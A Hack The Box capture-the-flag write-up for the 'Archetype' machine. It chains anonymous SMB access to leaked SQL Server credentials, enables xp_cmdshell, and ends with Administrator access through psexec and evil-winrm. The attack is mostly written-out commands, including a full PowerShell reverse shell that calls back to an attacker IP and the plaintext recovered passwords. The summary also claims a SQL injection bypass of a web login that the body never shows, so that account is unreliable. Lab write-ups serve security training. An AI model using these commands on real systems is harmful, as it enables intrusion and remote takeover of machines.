# Hack The Box Write-up: Archetype

- **Machine:** Archetype
- **IP Address:** 10.129.6.102
- **Platform:** Hack The Box
- **Difficulty:** Easy (Starting Point - Tier 2)

---

## Summary

"Archetype" is a Tier 2 machine that demonstrates a classic **vulnerability chaining** attack. The path to compromise involves enumerating an anonymous SMB share to discover database credentials, which are then used to perform a SQL Injection (SQLi) attack to bypass a web application's login page.

---

## Enumeration

The reconnaissance phase began with a comprehensive port scan to identify open services and their configurations.

**Command:**
`nmap -sV -sC -T4 -Pn 10.129.6.102`

**Results:**
The Nmap scan revealed several critical open ports on this Windows target:
- Port 135: Microsoft RPC
- Port 139: NetBIOS Session Service
- Port 445: Microsoft SMB
- Port 1433: Microsoft SQL Server
- Port 5985: WinRM (Windows Remote Management)

**Key Findings:**
- Windows-based target system
- SQL Server database service exposed
- SMB shares potentially accessible
- Multiple attack vectors available

**Extended Enumeration:**
```bash
# SMB enumeration
smbclient -L //10.129.6.102/ -N
enum4linux 10.129.6.102

# SQL Server enumeration
nmap --script ms-sql-info -p 1433 10.129.6.102

# Additional port scanning
nmap -p- --min-rate 10000 10.129.6.102
```

---

## Gaining Access (SMB -> Database Chain)

This attack involved a sophisticated multi-stage approach, chaining vulnerabilities across different services.

### Step 1: SMB Share Enumeration

**Anonymous SMB Access Testing:**
1. **Share Discovery:**
   I began by listing available SMB shares without authentication:
   ```bash
   smbclient -L //10.129.6.102/ -N
   ```
   
   This revealed several shares, including a 'backups' share that appeared accessible.

2. **Share Access:**
   I connected to the backups share anonymously:
   ```bash
   smbclient //10.129.6.102/backups -N
   ```
   
   The connection was successful, indicating misconfigured share permissions.

3. **File Discovery:**
   Within the share, I explored the directory structure:
   ```bash
   smb: \> ls
   smb: \> get prod.dtsConfig
   smb: \> quit
   ```

4. **Configuration Analysis:**
   I examined the downloaded configuration file:
   ```bash
   cat prod.dtsConfig
   ```
   
   This file contained database connection strings with credentials:
   - Username: `ARCHETYPE\sql_svc`
   - Password: `M3g4c0rp123`
   - Server: SQL Server instance details

### Step 2: SQL Server Database Access

**Database Connection:**
1. **Authentication Testing:**
   Using the discovered credentials, I attempted to connect to the SQL Server:
   ```bash
   # Using impacket's mssqlclient.py
   mssqlclient.py ARCHETYPE/sql_svc:'M3g4c0rp123'@10.129.6.102 -windows-auth
   
   # Alternative: Using sqlcmd (if available)
   sqlcmd -S 10.129.6.102 -U sql_svc -P M3g4c0rp123
   ```

2. **Database Enumeration:**
   Once connected, I explored the database environment:
   ```sql
   SELECT @@version;                    -- Get SQL Server version
   SELECT name FROM sys.databases;      -- List databases
   SELECT SYSTEM_USER;                  -- Current user context
   SELECT IS_SRVROLEMEMBER('sysadmin'); -- Check admin privileges
   ```

3. **Command Execution Capabilities:**
   I tested for command execution capabilities:
   ```sql
   -- Enable xp_cmdshell if disabled
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   
   -- Test command execution
   EXEC xp_cmdshell 'whoami';
   EXEC xp_cmdshell 'dir C:\Users';
   ```

### Step 3: System Access and Exploitation

**Reverse Shell Establishment:**
1. **PowerShell Reverse Shell:**
   I used SQL Server's command execution to establish a reverse shell:
   ```sql
   EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.3'',443);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + ''PS '' + (pwd).Path + ''> '';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"';
   ```

2. **Netcat Listener:**
   On my attacking machine:
   ```bash
   nc -nvlp 443
   ```

---

## Privilege Escalation & Flag Capture

**User Flag Discovery:**
1. **Initial System Access:**
   After establishing the reverse shell, I had access as the `sql_svc` user.

2. **User Flag Location:**
   ```bash
   # Navigate to user directory
   cd C:\Users\sql_svc\Desktop
   type user.txt
   ```

**Privilege Escalation:**
1. **System Enumeration:**
   I performed comprehensive system enumeration:
   ```bash
   # System information
   systeminfo
   whoami /priv
   net user sql_svc
   
   # Search for interesting files
   dir C:\ /s | findstr /i "password"
   dir C:\ /s | findstr /i "config"
   ```

2. **PowerShell History Analysis:**
   I examined PowerShell command history:
   ```bash
   type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
   ```
   
   This revealed Administrator credentials being used in previous commands.

3. **Credential Discovery:**
   Found Administrator password: `MEGACORP_4dm1n!!`

4. **Administrator Access:**
   Used the discovered credentials to gain Administrator access:
   ```bash
   # Using PSExec
   psexec.py administrator:'MEGACORP_4dm1n!!'@10.129.6.102
   
   # Or using WinRM
   evil-winrm -i 10.129.6.102 -u administrator -p 'MEGACORP_4dm1n!!'
   ```

**Root Flag Capture:**
1. **Administrator Shell:**
   With Administrator access established, I navigated to capture the root flag:
   ```bash
   cd C:\Users\Administrator\Desktop
   type root.txt
   ```

---

## Lessons Learned

This machine demonstrates several critical security principles and attack methodologies:

1. **Attack Surface Reduction:** Multiple services (SMB, SQL Server, WinRM) provided various attack vectors. Minimize exposed services to reduce attack surface.

2. **Configuration Management:** Sensitive information in configuration files (database credentials) led to system compromise. Secure configuration management is essential.

3. **Credential Hygiene:** Reused and weak passwords enabled privilege escalation. Implement strong, unique passwords and regular rotation.

4. **Defense in Depth:** A single vulnerability (anonymous SMB access) compromised multiple services. Layer security controls to prevent cascading failures.

5. **Database Security:** SQL Server xp_cmdshell functionality enabled command execution. Disable unnecessary database features and functions.

6. **Monitoring and Logging:** Implement comprehensive logging to detect unusual database queries and command executions.

7. **Network Segmentation:** Database servers should be isolated from direct internet access and properly segmented.

8. **Regular Security Assessments:** Regular penetration testing can identify vulnerability chains before attackers exploit them.
